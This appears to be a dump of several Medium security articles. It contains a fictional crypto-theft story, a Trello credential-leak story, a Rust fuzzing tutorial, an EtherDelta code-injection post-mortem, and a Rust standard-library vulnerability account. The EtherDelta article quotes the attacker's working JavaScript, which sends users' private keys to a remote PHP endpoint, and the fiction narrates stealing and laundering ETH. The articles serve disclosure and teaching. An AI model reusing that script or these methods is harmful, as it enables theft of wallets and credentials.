1- Find the Archetypes: Those are the “root” contracts based on which wallets are created.
2- Find the Children: Once I have those archetype addresses, I can find all the affected wallets that use the archetypes as library.
3- Triage: Rank the wallets by amount and grab the money from a random sample. I was thinking about 10–11k ETH in total.
4- Snatch: Do it all in one go.
5- Clean: Spend the next couple of months cleaning it up. It’s my job to catch people like me, so I know how get away with cashing out that amount in dollars/euros.
Have I said I’m an Ethereum-moron? Because I am. I genuinely tried to grep the blockchain files on-disk. �
How can I identify the archetypes? Well, after reading up on Ethereum, I learned that method signatures are calculated by the EVM as:
get_first_4_bytes(keccak256(“method_name(arg1_type, …, argn_type)”))
In hex, that would be 0xe46dcfeb. Not a lot of entropy there, but probably unique enough for scavenging through the blockchain. I quickly whipped out the following code and loaded it in my Geth, and then went to get some sleep. By now, it’s around 04:00 the next day — I needed the sleep.
Next day I woke up to this:
0x4f2875f631f4fc66b8e051defba0c9f9106d7d5a0xa657491c1e7f16adb39b9b60e87bbb8d93988bc30xc0ffee0505d21342cd503bc57ed33fc2cec7f225……
Not bad. Now to step #2.
My search method is very slow, but it worked. Searching through contract creation transactions is good enough for my purpose. Now I simply replaced the previous method signature with the newly-found archetype addresses. This was pretty straight forward.
I had some minor issues with Geth, but I didn’t have time since I had a work trip on Monday, so my retirement will have to wait.
On Monday night, once I was back from my trip, I loaded a backed up state from May and started a sync. This was pretty fast. I loaded my code in Geth and let it run all night. I woke up in the morning to a nice list of wallets and balances.
I plugged the list in Excel and ordered by balance. Ok, that’s A LOT of ETH. I got greedy. Why take 10k when I can empty one wallet and get ~ 25k? Ok. The limit is 25k. Let’s take this one. 0x91efffb9c6cd3a66474688d0a48aa6ecfe515aa5.
This was quite easy after I learned the API. It’s along the lines of
I snatched 26,793 ETH and was very happy with it. I bought with Bitcoin real quick and then went to bed. I slept like I’ve never slept before.
Next day while at work, the list of wallets and balances kept itching in the back of my head. Here I had access to several tens of times what I snatched already, so I wanted a bit more. At lunch time, I went home and emptied two more wallets.
This is the most annoying part. Getting even half of that amount in clean fiat is going to be a very difficult challenge. Getting it straight in cash is super easy, but getting to a stage where I can use it for the aforementioned purposes (paying loans, buying a house, etc.) is probably gonna take me until the end of next year.
Ropsten Tip Jar: 0x7BB4be527a4f3719e5d66a5f5Ee5f83c8d7e3aF1
Update 2017/9/14: Thanks for all nice comments. I’m glad that you guys found this entertaining and had fun reading it.
I’m also glad that a lot of you have picked up on the little things I’ve put here and there all over this piece. In case it wasn’t clear at this point, I’ll spell it explicitly — this is a fictional piece based on real events that happened on July 19th. This is my fan-fic take on how the Parity Hacker might have thought about how this went down.
Written by
","['Ethereum', 'ICO', 'Eth', 'Morality', 'Cybersecurity']"
How I used a simple Google query to mine passwords from dozens of public Trello boards,https://medium.com/free-code-camp/discovering-the-hidden-mine-of-credentials-and-sensitive-information-8e5ccfef2724?source=tag_archive---------0-----------------------,"A few days ago on 25th April, while researching, I found that a lot of individuals and companies are putting their sensitive information on their public Trello boards. Information like unfixed bugs and security vulnerabilities, the credentials of their social media accounts, email accounts, server and admin dashboards — you name it, is available on their public Trello Boards which are being indexed by all the search engines and anyone can easily find them.
I searched for Jira instances of companies running Bug Bounty Programs with the following search query:
Note: I used a Google dork query, sometimes referred to as a dork. It is a search string that uses advanced search operators to find information that is not readily available on a website. — WhatIs.com
I entered Trello in place of [company name]. Google presented a few results on Trello Boards. Their visibility was set to Public, and they displayed login details to some Jira instances. It was around 8:19 AM, UTC.
I was so shocked and amazed �
So why was this a problem? Well, Trello is an online tool for managing projects and personal tasks. And it has Boards which are used to manage those projects and tasks. The user can set the visibility of their boards to Private or Public.
After finding this flaw, I thought — why not check for other security issues like email account credentials?
I went on to modify my search query to focus on Trello Boards containing the passwords for Gmail accounts.
And what about SSH and FTP?
After spending a few hours using this technique, I uncovered more amazing discoveries. All while I kept on changing my search query.
Some companies use Public Trello boards to manage bugs and security vulnerabilities found in their applications and websites.
People also use Public Trello boards as a fancy public password manager for their organization’s credentials.
Some examples included the server, CMS, CRM, business emails, social media accounts, website analytics, Stripe, AdWords accounts, and much more.
Here’s another example:
Until then I was not focusing on any specific company or Bug Bounty Programs.
But nine hours after I discovered this thing, I had found the contact details of almost 25 companies that were leaking some very sensitive information. So I reported them. Finding contact details for some of them was a tedious and challenging task.
I posted about this in a private Slack of bug bounty hunters and a infosec Discord server. I also tweeted about this right after discovering this Trello technique. The people there were as amazed and astonished as I was.
Then people started telling me that they were finding cool things like business emails, Jira credentials, and sensitive internal information of Bug Bounty Programs through the Trello technique I shared.
Almost 10 hours after discovering this Trello technique, I started testing companies running Bug Bounty Programs specifically. I then began with checking a well-known ridesharing company using the search query.
I instantly found a Trello board that contained login details of an employee’s business email account, and another that contained some internal information.
To verify this, I contacted someone from their Security Team. They said they had received a report about the Board containing email credentials of an employee right before mine and about the other board containing some internal information. The security team asked me to submit a complete report to them because this is a new finding.
Unfortunately, my report got closed as a Duplicate. The ridesharing company later found out that they had already had received a report about the Trello board I found.
In the coming days, I reported issues to 15 more companies about their Trello boards that were leaking highly sensitive information about their organizations. Some were big companies, but many don’t run a Bug Bounty Program.
One of the 15 companies was running a Bug Bounty Program, however, so I reported to them through it. Unfortunately, they didn’t reward me because it was an issue for which they currently don’t pay. �
And just the other day, I found a bunch of public Trello Boards containing really sensitive information (including login details!) of a government. Amazing!
The Next Web and Security Affairs has also reported about this.
In the recent months I had discovered a total of 50 Trello Boards of the British and Canadian governments containing internal confidential information and credentials. The Intercept wrote a detailed article about it here.
In August, I found 60 public Trello boards, a public Jira and bunch of Google Docs of United Nations which were containing credentials to multiple FTP servers, social media & email account, lots of internal communication and documents. The Intercept wrote a detailed article about it here.
Thanks for reading my story.
If you liked this article, give me some claps �
And you can follow me on Twitter ✌️
I’d like to thank CyberSecStu, Toffee and the freeCodeCamp editorial team for helping me proofread and edit this article.
Written by
","['Archive', 'Programming', 'Technology', 'Privacy', 'Cybersecurity', 'Life Lessons']"
How I’ve found vulnerability in a popular Rust crate (and you can too),https://medium.com/@shnatsel/how-ive-found-vulnerability-in-a-popular-rust-crate-and-you-can-too-3db081a67fb?source=tag_archive---------7-----------------------,"I have recently discovered a zero-day vulnerability in a fairly popular and well-designed Rust crate. In this article I’m going to discuss how I did it and why it wasn’t discovered earlier, and introduce a new tool, libdiffuzz, that I’ve created for the job. A recently discovered vulnerability in Rust standard library makes a cameo appearance.
In my earlier article about a one-line unsafe block that has nearly ruined everything I’ve explained how I’ve used fuzzing to look for vulnerabilities in widely used Rust code. However, the titular one-life unsafe was found not through an automated process, but by manually reading the code. Why didn’t fuzzers discover it?
Fuzzers work by feeding your program random input and seeing what happens. They only detect that something is wrong if the program crashes. So in order to get fuzzers to actually discover memory issues that lead to vulnerabilities, you need some way to notice improper handling of memory when it happens. There have been many attempts to build such tools over the years, but the most practical and popular tool is Address Sanitizer. It reliably detects all sorts of bugs, is supported by Rust compiler out of the box, and is in fact enabled by default in one of Rust fuzzers, cargo-fuzz.
However, there is a class of memory issues that Address Sanitizer cannot detect: reading from uninitialized memory. If you can get a program to output contents of uninitialized memory, that’s called a “memory disclosure” vulnerability. There are multiple examples of such bugs in common C code, and in certain contexts they can be devastating: how about stealing cookies and passwords from web browser simply by displaying an image and running a bit of JavaScript?
There is a tool that can detect reads from uninitialized memory, called Memory Sanitizer, but it currently doesn’t work with Rust standard library. So unless you completely avoid using Rust standard library, there is no tool that let you detect reads from uninitialized memory in Rust.
Well, bummer. That means I’ll have to build one.
Since I’m only interested in memory disclosure vulnerabilities, i.e. cases when contents of uninitialized memory show up in the program output, it should be sufficient to run the same operation twice and compare the results. If a program has decompressed the same zip file twice and got different results, that usually means that contents of uninitialized memory have shown up in the output.
With that in mind, I’ve written a simple test program that reads from uninitialized memory and tried to detect it using the “run twice, compare results” technique. I wanted to be able to check if results differ between runs at a glance without comparing huge amounts of data by hand, so this is what I ended up with:
This program will panic if the use of uninitialized memory is detected. Our goal here is to get it to panic reliably — we know it’s buggy, we just need to be able to detect the bug automatically.
Turns out it’s not that easy because what uninitialized memory actually contains varies depending on the memory allocator in use. And no matter what memory allocator I tried, I couldn’t get it to crash. When built with Rust’s default jemalloc, sum_uninitialized() would always return 0. When built with system allocator (as in the code above), the return value would differ between different runs of the process, but not between different invocations of the function within the same process. I have even tried AFL’s libdislocator which is basically a poor man’s address sanitizer implemented as a memory allocator (which makes it usable on black-box binaries), and even that didn’t work: my sum_uninitialized() always produced a stable result.
At this point I’ve (mentally) screamed “How hard can it be?!”, opened the source code of libdislocator and trivially patched it to fill every allocated buffer with a value that’s incremented on every allocation instead of a constant value. And it worked! This test program started crashing!
Armed with my newly-minted abomination I went looking for a prospective real-world target to use it on. I’ve picked claxon, a FLAC decoder written in Rust, for a few reasons:
So I’ve thrown together a fuzz target that decoded the same file twice and checked that the result is the same (if you’re craving for fancy words, call this “differential fuzzing”), plugged it into AFL and left it overnight. And lo and behold, I woke up to 3 automatically discovered crashes!
And just as expected, the crashes were indeed happening on the assert!() that was comparing results from two subsequent runs and failing, and it only happened under libdiffuzz; they went completely unnoticed otherwise.
I have reported the vulnerability to crate maintainer, who has promptly investigated and fixed it, then audited the rest of the code for similar bugs and added fuzzing a target similar to mine as a CI job. Swift handling of security vulnerabilities by maintainers is always great to see, and Claxon’s maintainer went above and beyond the call of duty.
Side note: it later turned out that I forgot to disable checksum verification in Claxon, so most inputs generated by the fuzzer were rejected early because of checksum mismatch (random data doesn’t have valid CRC16 in it, duh). But thanks to the sheer amount of inputs AFL has thrown at Claxon it has generated some files with valid CRC16 anyway, by sheer luck. To give you some context: AFL tests roughly 1 billion inputs per day on my mid-range CPU.
I’ve opened a PR to automatically disable checksum verification in Claxon during fuzzing so we wouldn’t have to deal with it anymore. With checksums disabled it only takes a few minutes to discover the bug using libdiffuzz.
I have also tried fuzzing with AFL + libdiffuzz on lodepng-rust and miniz-oxide, but got nothing. lodepng-rust was created as a largely automated translation of a C codebase where these issues have already been discovered with AFL, and miniz-oxide actually comes with a “run twice, compare results” fuzz harness that compares Rust and C implementations. For those projects it was mostly about not triggering false alarm.
However, the entire rest of Rust ecosystem has probably never been fuzzed with anything that could detect use of uninitialized memory. So if you want to claim some zero-day vulnerability discoveries to your name, just pick a crate that has unsafe blocks in it, ideally with something like mem::uninitialized() or vec.set_len(), and give it a spin in a “run twice, compare results” fuzzing harness with libdiffuzz. There should be plenty of low-hanging fruit because nobody’s tried picking any of it yet.
I have published a cleaned-up version of my tool in github, check it out if you want to learn more or give it a spin: https://github.com/Shnatsel/libdiffuzz
It comes with a quickstart guide for Rust and a sample test harness that’s simpler than the one I’ve used for Claxon. Also, a list of caveats. Lots of them.
The short answer is “Because people have deliberately opted out of its safety guarantees.” But why did they opt out?
In Claxon it was for the sake of optimization. Here’s the commit that introduced unsafe code:
Note that before this commit the buffer is diligently initialized with zeroes using buffer.extend(repeat(0).take(new_len — len)); — quite a mouthful! Not only that’s complicated, it’s also slow — it compiles into something like a loop that fills the allocated memory with zeroes.
Other than the obvious issue with it being kinda slow on normal inputs, it can get excruciatingly slow on deliberately malformed inputs, which can be used to mount a denial-of-service attack. If the implementation is perfectly efficient and uses full memory bandwidth (roughly 100Gb/s for DDR4), filling the entire 64-bit address space would take 16,000,000,000 seconds - or 500 years. Even with memory usage limits it’s still not pretty, because a single file can do this over and over and over again.
However, modern operating systems let you request already zeroed memory, which not only is roughly 4x faster in my tests, but is also asynchronous and lazy: even if you allocate a lot of such memory, zeroing memory will not block your program you actually try to access the relevant parts of it.
Can you ask your OS to do that from Rust? Yes! std::vec::from_elem() will simply request zeroed memory from the OS if you pass 0 as the element to fill the vector with. This function is not public, but that’s what vec! macro desugars into, so the fastest way to initialize a vector of size max_len is actually vec![0; max_len];. After switching Claxon from using uninitialized memory to this macro there was no measurable performance difference.
Sadly, none of this is documented. The vec! macro is used all over the place in Vec documentation, but it does not mention that this is the fastest way by far to safely initialize a vector, or discuss about efficient initialization at all.
Documenting the fastest way to safely initialize a vector would have prevented this vulnerability.
I have opened an issue against Rust to document this more clearly.
I have also investigated the vulnerability in inflate, discussed here.
Side note:inflate was not actually exploitable, since the code calling the vulnerable function was structured in such a way that it never passed it the specific values required to exploit it. Still, the vulnerable function is an example of security bug in real-world code.
Unsafe code was used in inflate because there was no safe way to accomplish what they needed safely and efficiently. I have written a detailed analysis of it on the Rust internals forum, which I will not duplicate here.
I have also included a proposal for a safe abstraction that would prevent such issues in the future. The day after writing it the proposal I’ve started contemplating how I would go about implementing it, and then found that somebody has already written and posted a working prototype. Overnight. I didn’t even have to do anything. God I love Rust community.
In that thread Scott McMurray has brought up a similar function in the standard library, which could be used to solve the problem if it were generalized a bit. Then he took a closer look at it and realized that the standard library function was vulnerable too:
This is the second-ever security vulnerability in the standard library. In case you’ve missed it, I’ve written an article detailing the first one.
Just like the first stdlib vulnerability, this one was introduced during refactoring. Unlike the first one, it does not require a sequence of specific function calls, and would be easily discovered via fuzzing if anyone has actually fuzzed that particular function.
This led me to contemplate automatically generating fuzzing harnesses for the standard library functions, but I haven’t gotten around to actually prototyping that yet.
First things first: if you haven’t fuzzed your code yet, you should. Doesn’t have to be with libdiffuzz either — most bugs and almost all really severe vulnerabilities can be discovered without it. In Rust it’s stupidly easy and won’t take you more than 15 minutes to set up.
As the fuzzing trophy cases filled with bugs from real-world projects in both Rust and everything else can attest, you don’t know your code until you’ve fuzzed it.
My pet libdiffuzz might also be of use. Feel free to borrow it and subject your unsafe code to its unrelenting jaws.
However, fuzzing won’t find all of the bugs. Do not rely on it as proof that your 2-line unsafe block is actually secure! And even if it is secure now, someone will refactor it later and it will become exploitable - just like it happened in the standard library.
So if you can help it, try to refactor your unsafe code into safe. And if you can’t, post on rust-internals forum and describe what’s slow or what kind of safe abstractions you’re missing. For example, lewton crate is 100% safe code because it has upstreamed its only unsafe function into the standard library, where it got a lot more eyeballs. And it’s beneficial for others too: I have recently used this very function at work without having to worry about auditing a transmute by myself.
Also, there is a project to verify the implementations of data structures in Rust standard library, and it could use all the help it can get. And if you’re interested in auto-generating fuzzing harnesses for stateless stdlib functions, let me know. I can handle generating fuzz harnesses, but I could use some help with listing stdlib functions and parsing parameter types.
Discuss this article on Reddit
Written by
","['Rust', 'Cybersecurity', 'Security', 'Programming', 'Fuzzing']"
How one hacker stole thousands of dollars worth of cryptocurrency with a classic code injection hack on EtherDelta and what you can learn from it,https://medium.com/hackernoon/how-one-hacker-stole-thousands-of-dollars-worth-of-cryptocurrency-with-a-classic-code-injection-a3aba5d2bff0?source=tag_archive---------4-----------------------,"The attack detailed in this post has already been fixed by the EtherDelta team. I share this as a cautionary tale for Dapp developers and cryptocurrency users.
On September 24, 2017 I learned about a malicious code injection that allowed a hacker to steal private keys from multiple victims’ wallets and then manually drain the funds from those wallets. I will attempt to describe the attack, the security vulnerability that made it possible, and as much information as I have on the attacker.
For those who don’t know, EtherDelta is a cryptocurrency exchange for Ethereum and ERC20 compatible tokens (tokens that have been deployed on the Ethereum blockchain). These tokens can be stored and transfered with Ethereum wallets and smart contracts, and the entire EtherDelta exchange runs on a single smart contract, which you can view here:
https://etherscan.io/address/0x8d12a197cb00d4747a1fe03395095ce2a5cc6819#code
EtherDelta is a clever exchange — it does not require a traditional server architecture, because the back end architecture is a smart contract deployed on the Ethereum blockchain. It is a true Dapp, or Distributed Application, in the cryptocurrency sense of the word. When users “trade” on EtherDelta, they have to either create a wallet that they can use to interact with this smart contract, or they connect their existing wallet to EtherDelta to interact with the smart contract. The EtherDelta frontend functions much like MyEtherWallet.com, in that the website you load in your browser is a full wallet management application that also exposes the methods from the EtherDelta smart contract. Thus, users of EtherDelta must enter their public wallet address and private key when using the site, meaning their private key could be captured from the browser session by a malicious code injection.
In short, when you send your funds to a traditional exchange, you are trusting your funds to the exchange’s wallet or smart contract. If the exchange decides to rob its users, or it gets shuttered due to illegal behavior, you will lose your money. When you use EtherDelta, you are “trusting” your wallet’s private key (the key that can give anyone the ability to take the funds from your wallet) to the browser session, and you are “trusting” your funds to the EtherDelta smart contract. In the case of EtherDelta, you can read the entire source code for the site on GitHub:
https://github.com/etherdelta/etherdelta.github.io
and you can read the entire code for the smart contract at the link above. Thus you can verify that the service is not funneling your data or funds outside of your control in any way… but there are still risks. These risks fall into two categories:
1. Someone could trick you into visiting a fake clone of EtherDelta that uses a different smart contract, which can steal your funds when you transfer to it.2. Someone could inject code into the real EtherDelta that “sniffs” the private keys from the browser session, giving them unlimited access to your wallet. This is the category the attack detailed in this piece falls under.
I want to make one point clear: I believe that EtherDelta, in concept, is safer and more “trustworthy” than a traditional exchange. Everything about how EtherDelta functions is transparent and verifiable by users. The service creates a trustless, purely software-based interface between users executing buy & sell orders, and does not keep a record of this behavior other than the transfers that are recorded on the Ethereum blockchain. The attack detailed in this piece could have been identified by anyone before it was exploited, and if there had been a security review protocol in place, it would have been easily prevented. Also, once it was reported to the EtherDelta team, it was patched within a few hours.
EtherDelta allows any ERC20 token to be traded by users. There are many tokens that are officially listed on the platform; the URL for these tokens looks like this:
https://etherdelta.com/#LINK-ETH
For any tokens that are not officially listed by the site, you can still trade them just the same using the address of the ERC20 token contract (the genesis contract that is used to create the tokens on the Ethereum blockchain and distribute them to users). To do this, you just modify the URL to include this address, like so:
https://etherdelta.com/#0x514910771af9ca656af840dff83e8264ecf986ca-ETH
In this case, the two URLs above are for the same token, ChainLink. You can read the ERC20 token contract for ChainLink here:
https://etherscan.io/token/0x514910771af9ca656af840dff83e8264ecf986ca
For each token, the EtherDelta interface displays the name of the token at the top of the screen. For unlisted tokens, it would display the address of the token contract (that long string that starts with 0x514…). At some point, the EtherDelta team decided it would be nice to lift the name of the token contract and display that in the EtherDelta interface instead, so the page displayed “ChainLink Token” instead of “0x514910771af9ca656af840dff83e8264ecf986ca”.
Taking any content from outside of the webpage and displaying it to the user (whether this content is user input or copied from another source, like a database, API, or another website) creates the possibility for an injection vulnerability. Web developers usually use validation methods to ensure that the content being displayed is only numbers, letters, or an acceptable range of characters, or will explicitly strip or modify certain types of content (like < > used for HTML tags or ( ) used for JavaScript code) to prevent the displayed content from actually being executed as live code.
I think you can see where this is going.
The attacker gained the trust of users through cryptocurrency chat rooms on Discord and Slack, and sent these users a link for an unlisted token on EtherDelta. He also posted this link in the official EtherDelta chat powered by Gitter. The contract address in the URL of this link was a malicious contract deployed by the attacker, where the name of the contract included a block of JavaScript code. When the name of the contract was displayed on the page, the JavaScript code was also “displayed” and thus executed, with full access to the data in the user’s session on EtherDelta. Here is the code from the malicious contract that was executed:
f`[¤ ]DATA <script> function doSomething(){for($(“#depositBalanceToken a”).text().indexOf(“‘)”>DATA”)>=0&&$(“#depositBalanceToken a”).text(“DATA”),savedKeys=[],a=1;a<main.EtherDelta.addrs.length;a++)singlekey=[],singlekey[0]=main.EtherDelta.addrs[a],singlekey[1]=main.EtherDelta.pks[a],savedKeys.push(singlekey);var e={object:JSON.stringify(savedKeys)};$.post(“https://cdn-solutions.com/update.php"",e,function(e,n,t){}),setTimeout(doSomething,1e4)}var savedKeys=[];if(void 0===onlyonce){var onlyonce=!0;doSomething(),ga=function(){},doSomething(),$(“#accountSubmit”).click(function(){doSomething()})} </script>
Any web developer will immediately see what this script is doing. For those who just see Greek, the code reads the private key for the user’s wallet(s) from the browser session and then sends these keys to a remote PHP script which the attacker presumably used to collect these keys and then manually loaded the wallets and transferred the funds out to other wallets. The victims did not even realize this attack was taking place (there is a lot of JavaScript running already in the EtherDelta interface and the victims would not have thought of looking for data being transferred to remote locations). Also, the wallets that the attacker used to collect users’ funds were different from the malicious contract that was used to inject the code into the EtherDelta interface, so when the victims would follow the transactions to see where their funds were going, they couldn’t identify what allowed the attacker to gain access to their funds in the first place. In order to find the “smoking gun” for this attack, one of the victims had to go back to the malicious link, copy the contract address, paste it into Etherscan, and read the contract source thoroughly to find this code block. This victim didn’t know what the code did, just that it looked suspicious, so he shared it in one of the cryptocurrency chat rooms that I frequent, and I immediately realized what this code was capable of and explained it to him. By this time, the EtherDelta team was already working on a solution, which they announced here:
Oh, and in case you are wondering, this victim had ~$6,000 USD worth of cryptocurrency stolen from him. To date, no bug bounty has been offered for his efforts in tracking down the vulnerability.
Update: I have collected more information on the malicious contract and the hacker behind it in a follow-up post: “Following the trail.”
Let this be a cautionary tale to everyone.
Are you a Dapp developer? Trustless software requires a trustless mindset. Take Murphy’s law to heart: whatever can go wrong, will. Don’t assume that anything you are relying on is “safe.” Take the necessary measures to “fence” your own software as much as possible. That includes validating and sanitizing all inputs as well as a myriad of other measures. This is imperative for financial software. Cryptocurrency services should have the same level of security & reliability that users expect of banks. And by all means, validate your assumptions with an extra pair of eyes. Hire someone (or multiple people) to conduct security audits of your software and test every possible scenario. The potential for lost customers due to malicious behavior that was enabled by your own oversight is not worth the risk. Also, keep in mind that this attack was partly enabled by an attempt to make EtherDelta more convenient (displaying a human-readable and recognizable token name instead of the contract address). Anything that makes a product better or more convenient carries risk. Make sure you know the risks before making even the smallest change.
Are you a cryptocurrency user?
And please, share this with others so they can learn too. We are all in this together! Be safe.
Update 9/27: I received a request for proof of a change to the EtherDelta codebase that fixed this bug. Since the EtherDelta codebase is published to GitHub in a minified format (the entire JavaScript codebase is obfuscated and squashed down to 1 line), I figured it would be very difficult to find the change, but I want to remove all possibility of doubt, so I went ahead and dug for it.
Firstly, I had to un-minify the main.js file from the commits that took place before and during September 24. These are:
and
To un-minify main.js, I used js-beautify on the command line. Let’s just say this took a while since the file is over 2 MB.
I then had to manually search for keywords that might point to where the code pulls in the information from a custom contract… words like token, address, custom, etc. After searching for “address” a bunch of times, I finally came to a function that parses an ERC20 token contract using the web3 API (an API for interacting with the Ethereum blockchain, IIRC). And here it is:
In commit 76df489..., an extra function call xss() is added to the step that unpacks the abi of the remote token contract. Here is how this same section is written in the previous commit:
(I won’t be publishing the un-minified files, but you are welcome to download main.js from the EtherDelta GitHub repository and un-minify it yourself to see this.)
In searching the repository for this new method, I also found an issue that was reported to the issue tracker, based on another hack: custom Javascript being loaded directly through the URL. I did not even know this was possible, but here it is:
As mentioned, the new library that is being used to prevent these types of attacks is js-xss:
In researching this, I came to the realization that the fundamental way EtherDelta operates is by loading custom code from remote locations (in this case, smart contracts published on the blockchain). For those of you who have experience developing web applications, you probably already know that any scenario that involves loading and executing custom code from remote locations is considered very dangerous, especially when there is no way to know who is responsible for the remote code being loaded. Obviously with EtherDelta, the responsibility is on the end user to determine which remote smart contract they wish to load (or, to avoid suspicious URLs from malicious individuals). The EtherDelta application runs entirely in the user’s browser, so the only way a user can have their data compromised is if they provide the data themselves (by importing their wallet) and if they expose themselves through their own behavior (by clicking a malicious link). That being said, the vast majority of users would never expect that using a website like EtherDelta carries this kind of risk (I have a degree in computer engineering and even I didn’t know this sort of vulnerability would be possible, but I’m glad I learned about it).
I also received a few questions from users curious to know whether this vulnerability would have affected Metamask or Ledger wallets. I can say without a doubt that Metamask and Ledger were both safe from this hack, because both only expose APIs that EtherDelta uses to interact with a user’s wallet, rather than using the user’s private key to load the user’s wallet directly. Essentially, if you want to be absolutely certain that your private key is not at risk of being exposed, either use a secure application/device like Metamask or Ledger, or be absolutely certain that you are visiting EtherDelta.com in a secure way.
Thank you to everyone who has shared this post. At the very least, I hope this has been an educational cautionary tale for everyone.
p.s. to my knowledge, none of the victims of this attack have been able to recover their funds or receive compensation from ED, and ED has not issued a bug bounty to anyone.
Was this content helpful? Leave a tip to show your appreciation:
BTC: 16pHiDSKNYjCCf6D4SQbdon5pmxpNXiHTS
ETH: 0x4ebee6ba2771c19adf9af348985bcf06d3270d42
DOGE: DPWkQr5rHwcCecyadXVHnZWMamHbS5ip5g
Thanks!
Written by
","['About', 'Help', 'Go Home', 'Ethereum', 'Cryptocurrency', 'Cybersecurity', 'Bitcoin', 'Software Development']"
How Rust’s standard library was vulnerable for years and nobody noticed,https://medium.com/@shnatsel/how-rusts-standard-library-was-vulnerable-for-years-and-nobody-noticed-aebf0503c3d6?source=tag_archive---------0-----------------------,"Rust is a new systems programming language that prides itself on memory safety and speed. The gist of it is that if you write code in Rust, it goes as fast as C or C++, but you will not get mysterious intermittent crashes in production or horrific security vulnerabilities, unlike in the latter two.
That is, until you explicitly opt in to that kind of thing. Uh oh.
You see, Rust provides safe abstractions that let you do useful stuff without having to deal with the complexities of memory layouts and other low-level arcana. But dealing with those things is necessary to run code on modern hardware, so something has to deal with it. In memory-safe languages like Python or Go this is usually handled by the language runtime — and Rust is no exception.
In Rust, the nutty-gritty of hazardous memory accesses is handled by the standard library. It implements the basic building blocks such as vectors that expose a safe interface to the outside, but perform potentially unsafe operations internally. To do that, they explicitly opt in to potentially unsafe operations (read: barely reproducible crashes, security vulnerabilities) by annotating a block with unsafe, like this: unsafe { Dragons::hatch(); }
However, Rust is different from languages like Python or Go in that it lets you use unsafe outside the standard library. On one hand, this means that you can write a library in Rust and call into it from other languages, e.g. Python. Language bindings are unsafe by design, so the ability to write such code in Rust is a major advantage over other memory-safe languages such as Go. On the other hand, this opens the floodgates for judicious use of unsafe. In fact, a couple of months ago a promising library caught some flak for engaging in precisely this sort of thing. So when I was trying to gauge whether Rust actually delivers on its promise of memory safety, that’s where I started.
I’ve messed with popular Rust libraries over the course of a month and then described my findings in Auditing popular Rust crates: how a one-line unsafe has nearly ruined everything. The TL;DR version of it is that Rust crates do sometimes use unsafe when it’s not absolutely necessary, and bugs that lead to denial of service are abundant, but after poking six different crates I have failed to get an actual exploit.
Clearly, I had to kick it up a notch.
There is a highly effective technique for discovering vulnerabilities that I haven’t applied to Rust yet. It beats everything else by a long shot, and can be used only by the bad guys who want to break stuff, not the good guys who fix it. It’s… searching the bug tracker.
You see, most people writing code in C or C++ are not actually security-minded. They just want their code to work and go fast. When they encounter a bug that makes the program output garbage or crash, they simply fix it and go investigate the next bug. What else is there to do?
Well, turns out in C and C++ many of those bugs are caused by mistakes in memory management. It’s those kinds of bugs that present remote code execution vulnerabilities, and that safe Rust is designed to prevent. The proper way to handle them is to file them into a database called Common Vulnerabilities and Exposures (CVE for short) so that people who care about security are alerted to it and ship fixes to users. In practice such bugs are silently fixed in the next release at best, or remain open for years at worst, until either someone discovers them independently or the bug is caught powering some kind of malware in the wild.
This leaves a lot of security vulnerabilities in plain sight on the public bug tracker, neatly documented, just waiting for someone to come along and weaponize them.
I particularly like an example of such a bug in libjpeg that was discovered in 2003 but not recognized as a security issue. The patch to fix it ended up in limbo until 2013, at which point it was incorporated into an update so obscure that nobody received it anyway. The fix did not even get a changelog entry. It was independently discovered later in 2013 by Michal Zalewski, author of afl-fuzz, and after 10 years since the vulnerability was discovered the fix has at last shipped.
That is, anyone who has bothered to just scroll through the bug tracker could steal cookies and passwords out of your web browser by simply loading an image and a bit of JavaScript for 10 years.
Touché.
The worst part is, bugs that are already fixed are not eligible for bug bounties. So the Bugtracker Search technique will not get you bug bounty money; it will, however, get you real exploits for production systems. This is why it’s unrivaled if you want to break stuff, and useless if you want to fix it and not go broke in the process.
Also, getting maintainers to take your “this is a security vulnerability” comments seriously can be problematic, and actually exploiting the bug to prove it can be a lot of work, which further discourages pro bono applications of this technique.
Actually applying the Bugtracker Search™ to Rust code was even easier than I expected. Turns out GitHub lets you search all the projects written in a certain language, so I’ve just typed “unsound” in search query, selected “Rust” as language and off we go! Bugs, bugs everywhere!
I did not have much time to spare at the moment, so typing “crash” instead of “unsound” in the search box is left as an exercise for the reader. Also, I’ve only searched for open bugs in recently updated projects and ignored the standard library (those guys gotta be responsible, right?).
This got me my first Rust zero-day exploit! It was discovered two months before I’ve found it through github search and comes with its own blogpost, albeit focusing on performance. After I pointed out that it is a security vulnerability, the crate maintainer has fixed it within two hours. And then has backported the fix to every affected series even though the crate is still in 0.x.x versions. Kudos!
Still, actually exploiting this bug in practice is tricky. It would be a good candidate for exploit chaining, but it’s hard to use by itself.
Okay, that was not ultimate enough. Time to kick it up another notch.
At this point we’re looking for something that is straightforward to exploit (something like buffer overflow with data an attacker can control) and has not been recognized as a security vulnerability yet.
It doesn’t matter if the bug is fixed in the latest version of the code: people lack incentives to update to the latest version as long as whatever they’re using works for them, and have a very clear incentive to not upgrade because whatever they’re using is known to work well, while the latest update is not.
So even if there is an update that fixed the issue, a lot of people will not actually install it, because there is no reason to — unless it is marked as a security update.
I was contemplating my course of action when I’ve accidentally stumbled upon a reddit thread discussing the history of vulnerabilities in the Rust standard library, which pointed out this gem:
seg fault pushing on either side of a VecDequehttps://github.com/rust-lang/rust/issues/44800
This is a buffer overflow bug in the standard library’s implementation of a double-ended queue. The data written out of bounds is controlled by the attacker. This makes it a good candidate for a remote code execution exploit.
The bug affects Rust versions 1.3 to 1.21 inclusive. It is causing a crash that is relatively easy to observe, yet it has gone unnoticed for two years. In the release that fixed it it did not even get a changelog entry. No CVE was filed about this vulnerability.
As a result, Debian Stable still ships vulnerable Rust versions for some architectures. I expect many enterprise users to have vulnerable versions as well.
As usual, bad guys win.
I did not expect to find something like this in the standard library because Rust has a very well thought out and responsible security policy (other projects, take note!), and the Rust security team consists of people who regularly work on the compiler and standard library. The fix should not have gone unnoticed.
I have contacted the Rust security team about the issue, asking them to make an announcement and file a CVE. The reply was:
Hey Sergey,
This was fixed way back in September; we don’t support old Rusts. As such, it’s not really eligible for this kind of thing at this point, as far as our current policies goes. I’ll bring it up at a future core team meeting, just in case.
And then, shortly:
<snip>
We talked about this Wednesday evening.
- We do want to change our policy here — The current policy is that we only support the latest Rust — The general feeling is “if it’s important enough for a point release, it’s important enough for a CVE” — This specific patch does seem like it should have gotten more attention at the time — This stuff also obviously ties into LTS stuff as well- We don’t have the time or inclination to work on updating this policy until after the [2018] edition ships — We’d rather take the time to get it right, but don’t have the time right now
Okay, I have to admit that this sounds reasonable.
